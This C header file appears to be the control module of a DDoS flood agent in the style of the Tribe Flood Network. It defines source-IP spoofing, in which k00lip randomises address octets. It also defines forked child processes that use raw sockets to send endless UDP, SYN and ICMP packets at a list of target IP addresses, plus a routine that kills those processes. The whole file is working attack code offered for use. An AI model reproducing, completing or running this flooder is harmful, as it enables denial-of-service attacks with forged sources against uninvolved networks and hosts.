#ifndef _CONTROL_H
#define _CONTROL_H
#include "tubby.h"

int icmpsize = 1024;
int udppsize = 1024;
u_long myip = 2130706433;	/* 127.0.0.1 host byte ordered */
int kiddie = 0, fw00ding = 0, nospoof = 0, pid[CHILDS];
int rawsock;
int lowport = 0;
int highport = 140;

#ifdef LINUX
struct timeval
  {
    time_t tv_sec;              /* Seconds.  */
    time_t tv_usec;             /* Microseconds.  */
  };
#endif


u_long
k00lip (void)
{
  struct in_addr hax0r;
  char convi[16];
  int a, b, c, d;

  if (nospoof < 1)
    return (u_long) random ();

  hax0r.s_addr = htonl (myip);

  srandom ((time (0) + random () % getpid ()));		/* supreme random leetness */

  sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);

  if (nospoof < 2)
    b = getrandom (1, 254);
  if (nospoof < 3)
    c = getrandom (1, 254);
  d = getrandom (1, 254);

  sprintf (convi, "%d.%d.%d.%d", a, b, c, d);

  return inet_addr (convi);
}

char *
k00lntoa (void)
{
  struct in_addr hax0r;
  hax0r.s_addr = k00lip ();
  return (inet_ntoa (hax0r));
}

void
commence_udp (char *ipstohit)
{
  int i, p;
  char *savepointi;

  savepointi=ipstohit;
  for (i = 0; i <= CHILDS - 1; i++)
    {
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  while (1) {
           udp (*(int*)ipstohit);
           ipstohit=ipstohit+4;
           if (*ipstohit=='\0') {
            ipstohit=savepointi;
           }
          }
	 }
      pid[i] = p;
    }
}

void
commence_syn (char *ipstohit)
{
  int i, p;
  char *savepointi;
  int port;

  port=lowport;  
  savepointi=ipstohit;
  for (i = 0; i <= CHILDS - 1; i++)
    {
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  while (1) {
           syn (*(int*)ipstohit, port);
           ipstohit=ipstohit+4;
           if (*ipstohit=='\0') {
            ipstohit=savepointi;
           }
           port++;
           if (port==highport) port=lowport; 
          }
         }
      pid[i] = p;
    } 
}

void
commence_icmp (char *ipstohit)
{
  int i, p;
  char *savepointi;

  savepointi=ipstohit;

  for (i = 0; i <= CHILDS - 1; i++)
    {
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  while (1) {
           icmp (*(int*)ipstohit);
           ipstohit=ipstohit+4;
           if (*ipstohit=='\0') {
            ipstohit=savepointi;
           }
          }
	}
      pid[i] = p;
    }
}

void
must_kill_all (void)
{
  int i;

  for (i = 0; i <= CHILDS - 1; i++)
    kill (pid[i], 9);
}

char *
strfl (void)
{
  if (fw00ding == 1)
    return "UDP";
  if (fw00ding == 2)
    return "SYN";
  if (fw00ding == 3)
    return "ICMP";
  return "NOT";
}
#endif
